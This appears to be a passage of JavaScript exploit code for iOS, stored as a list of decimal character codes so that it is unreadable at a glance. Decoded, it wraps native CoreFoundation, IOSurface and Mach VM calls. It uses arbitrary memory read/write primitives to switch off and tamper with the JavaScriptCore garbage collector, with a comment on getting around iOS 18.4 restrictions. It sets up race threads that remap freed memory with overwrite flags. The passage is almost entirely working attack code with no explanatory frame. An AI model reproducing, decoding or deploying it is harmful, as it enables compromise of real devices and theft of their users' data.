70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 116, 104, 101, 84, 121, 112, 101, 44, 32, 118, 97, 108, 117, 101, 80, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 40, 100, 105, 99, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 44, 32, 100, 105, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 40, 115, 117, 114, 102, 97, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 44, 32, 115, 117, 114, 102, 97, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 111, 98, 106, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 111, 98, 106, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 112, 101, 114, 109, 105, 115, 115, 105, 111, 110, 44, 32, 111, 98, 106, 101, 99, 116, 95, 104, 97, 110, 100, 108, 101, 44, 32, 112, 97, 114, 101, 110, 116, 95, 101, 110, 116, 114, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 97, 115, 107, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 44, 32, 109, 97, 115, 107, 44, 32, 102, 108, 97, 103, 115, 44, 32, 111, 98, 106, 101, 99, 116, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 99, 111, 112, 121, 44, 32, 99, 117, 114, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 124, 32, 40, 109, 97, 120, 95, 112, 114, 111, 116, 101, 99, 116, 105, 111, 110, 32, 60, 60, 32, 51, 50, 110, 41, 44, 32, 105, 110, 104, 101, 114, 105, 116, 97, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 109, 97, 112, 40, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 77, 65, 80, 44, 32, 97, 100, 100, 114, 44, 32, 108, 101, 110, 44, 32, 112, 114, 111, 116, 44, 32, 102, 108, 97, 103, 115, 44, 32, 102, 100, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 117, 110, 108, 111, 99, 107, 40, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 85, 78, 76, 79, 67, 75, 44, 32, 97, 100, 100, 114, 101, 115, 115, 44, 32, 115, 105, 122, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 116, 97, 115, 107, 44, 32, 110, 97, 109, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 48, 120, 50, 48, 51, 110, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 118, 97, 108, 61, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 98, 117, 102, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 49, 110, 44, 32, 56, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 98, 117, 102, 44, 32, 118, 97, 108, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 98, 117, 102, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 32, 61, 32, 104, 101, 97, 112, 32, 43, 32, 48, 120, 50, 52, 49, 110, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 83, 97, 102, 101, 84, 111, 67, 111, 108, 108, 101, 99, 116, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 101, 110, 97, 98, 108, 101, 100, 33, 33, 34, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 32, 123, 10, 32, 32, 32, 32, 47, 42, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 80, 114, 111, 98, 108, 101, 109, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 71, 67, 32, 105, 115, 32, 116, 114, 105, 103, 103, 101, 114, 105, 110, 103, 44, 32, 97, 110, 100, 32, 105, 116, 32, 99, 97, 108, 108, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 45, 62, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 46, 103, 101, 116, 82, 101, 103, 105, 115, 116, 101, 114, 115, 32, 45, 62, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 10, 32, 32, 32, 32, 32, 32, 32, 32, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 105, 115, 32, 98, 97, 110, 110, 101, 100, 32, 98, 121, 32, 97, 117, 116, 111, 98, 111, 120, 32, 105, 110, 32, 62, 61, 49, 56, 46, 52, 32, 119, 104, 105, 99, 104, 32, 108, 101, 97, 100, 115, 32, 116, 111, 32, 99, 114, 97, 115, 104, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 83, 111, 108, 117, 116, 105, 111, 110, 58, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 84, 111, 32, 119, 111, 114, 107, 32, 99, 111, 114, 114, 101, 99, 116, 108, 121, 32, 105, 110, 32, 110, 111, 106, 105, 116, 32, 101, 110, 118, 105, 114, 111, 110, 109, 101, 110, 116, 32, 71, 67, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 115, 99, 97, 110, 32, 97, 116, 32, 108, 101, 97, 115, 116, 32, 116, 104, 101, 32, 115, 116, 97, 99, 107, 32, 111, 102, 32, 99, 117, 114, 114, 101, 110, 116, 32, 116, 104, 114, 101, 97, 100, 32, 119, 105, 116, 104, 32, 99, 97, 108, 108, 32, 116, 111, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 73, 116, 32, 100, 111, 101, 115, 110, 39, 116, 32, 105, 110, 118, 111, 108, 118, 101, 32, 99, 97, 108, 108, 105, 110, 103, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 32, 115, 111, 32, 105, 116, 39, 115, 32, 115, 97, 102, 101, 32, 116, 111, 32, 100, 111, 46, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 118, 111, 105, 100, 32, 77, 97, 99, 104, 105, 110, 101, 84, 104, 114, 101, 97, 100, 115, 58, 58, 103, 97, 116, 104, 101, 114, 67, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 40, 46, 46, 46, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 97, 116, 104, 101, 114, 70, 114, 111, 109, 67, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 40, 99, 111, 110, 115, 101, 114, 118, 97, 116, 105, 118, 101, 82, 111, 111, 116, 115, 44, 32, 106, 105, 116, 83, 116, 117, 98, 82, 111, 117, 116, 105, 110, 101, 115, 44, 32, 99, 111, 100, 101, 66, 108, 111, 99, 107, 115, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 83, 116, 97, 116, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 46, 46, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 33, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 40, 108, 111, 99, 107, 101, 114, 44, 32, 98, 117, 102, 102, 101, 114, 44, 32, 99, 97, 112, 97, 99, 105, 116, 121, 44, 32, 38, 115, 105, 122, 101, 44, 32, 42, 99, 117, 114, 114, 101, 110, 116, 84, 104, 114, 101, 97, 100, 41, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 114, 111, 119, 66, 117, 102, 102, 101, 114, 40, 115, 105, 122, 101, 44, 32, 38, 98, 117, 102, 102, 101, 114, 44, 32, 38, 99, 97, 112, 97, 99, 105, 116, 121, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 79, 110, 32, 116, 104, 101, 32, 111, 116, 104, 101, 114, 32, 104, 97, 110, 100, 44, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 119, 105, 108, 108, 32, 116, 114, 121, 32, 116, 111, 32, 105, 116, 101, 114, 97, 116, 101, 32, 116, 104, 114, 101, 97, 100, 115, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 97, 110, 100, 32, 99, 97, 108, 108, 32, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 95, 115, 116, 97, 116, 101, 46, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 87, 101, 32, 99, 97, 110, 32, 97, 118, 111, 105, 100, 32, 105, 116, 32, 98, 121, 32, 110, 117, 108, 108, 105, 110, 103, 32, 102, 105, 114, 115, 116, 32, 109, 101, 109, 98, 101, 114, 32, 111, 102, 32, 104, 101, 97, 112, 46, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 46, 116, 104, 114, 101, 97, 100, 115, 32, 119, 104, 105, 99, 104, 32, 112, 114, 101, 118, 101, 110, 116, 115, 32, 105, 116, 101, 114, 97, 116, 105, 111, 110, 32, 97, 110, 100, 32, 115, 116, 105, 108, 108, 32, 109, 97, 107, 101, 115, 32, 116, 114, 121, 67, 111, 112, 121, 79, 116, 104, 101, 114, 84, 104, 114, 101, 97, 100, 83, 116, 97, 99, 107, 115, 32, 114, 101, 116, 117, 114, 110, 32, 116, 114, 117, 101, 46, 10, 32, 32, 32, 32, 10, 32, 32, 32, 32, 42, 47, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 118, 109, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 103, 108, 111, 98, 97, 108, 84, 104, 105, 115, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 32, 43, 32, 48, 120, 51, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 104, 101, 97, 112, 32, 61, 32, 118, 109, 32, 43, 32, 48, 120, 99, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 104, 101, 97, 112, 32, 43, 32, 48, 120, 49, 57, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 116, 104, 114, 101, 97, 100, 115, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 95, 116, 104, 114, 101, 97, 100, 71, 114, 111, 117, 112, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 116, 104, 114, 101, 97, 100, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 48, 120, 48, 110, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 76, 79, 71, 40, 34, 91, 43, 93, 32, 103, 99, 32, 100, 105, 115, 97, 114, 109, 101, 100, 34, 41, 59, 10, 125, 10, 10, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 100, 105, 115, 97, 114, 109, 95, 103, 99, 40, 41, 59, 10, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 72, 101, 108, 108, 111, 32, 102, 114, 111, 109, 58, 32, 34, 32, 43, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 46, 104, 101, 120, 40, 41, 41, 59, 10, 76, 79, 71, 40, 34, 91, 43, 93, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 58, 32, 34, 32, 43, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 46, 104, 101, 120, 40, 41, 41, 59, 10, 10, 108, 101, 116, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 61, 32, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 56, 110, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 48, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 49, 56, 110, 59, 10, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 48, 110, 59, 10, 108, 101, 116, 32, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 108, 101, 116, 32, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 32, 61, 32, 115, 104, 97, 114, 101, 100, 95, 109, 101, 109, 32, 43, 32, 48, 120, 51, 48, 110, 59, 10, 10, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 108, 101, 116, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 114, 101, 101, 95, 116, 104, 114, 101, 97, 100, 40, 41, 32, 123, 10, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 117, 114, 101, 97, 100, 54, 52, 40, 103, 111, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 32, 33, 61, 32, 48, 110, 41, 32, 123, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 101, 110, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 99, 109, 112, 56, 95, 119, 97, 105, 116, 95, 102, 111, 114, 95, 99, 104, 97, 110, 103, 101, 40, 114, 97, 99, 101, 95, 115, 121, 110, 99, 95, 112, 116, 114, 44, 32, 48, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 100, 105, 115, 97, 98, 108, 101, 95, 103, 99, 40, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 95, 115, 121, 110, 99, 95, 112, 116, 114, 41, 59, 10, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 65, 108, 108, 111, 99, 97, 116, 101, 32, 97, 32, 110, 101, 119, 32, 110, 111, 110, 45, 99, 111, 110, 116, 105, 103, 117, 111, 117, 115, 32, 109, 97, 112, 32, 101, 110, 116, 114, 121, 32, 40, 111, 112, 116, 105, 111, 110, 97, 108, 108, 121, 32, 117, 115, 105, 110, 103, 32, 97, 32, 109, 101, 109, 111, 114, 121, 32, 111, 98, 106, 101, 99, 116, 41, 10, 32, 32, 32, 32, 32, 32, 32, 32, 107, 114, 32, 61, 32, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 40, 109, 97, 99, 104, 95, 116, 97, 115, 107, 95, 115, 101, 108, 102, 40, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 103, 101, 116, 95, 98, 105, 103, 105, 110, 116, 95, 97, 100, 100, 114, 40, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 41, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 102, 114, 101, 101, 95, 116, 97, 114, 103, 101, 116, 95, 115, 105, 122, 101, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 124, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 116, 97, 114, 103, 101, 116, 95, 111, 98, 106, 101, 99, 116, 95, 111, 102, 102, 115, 101, 116, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 48, 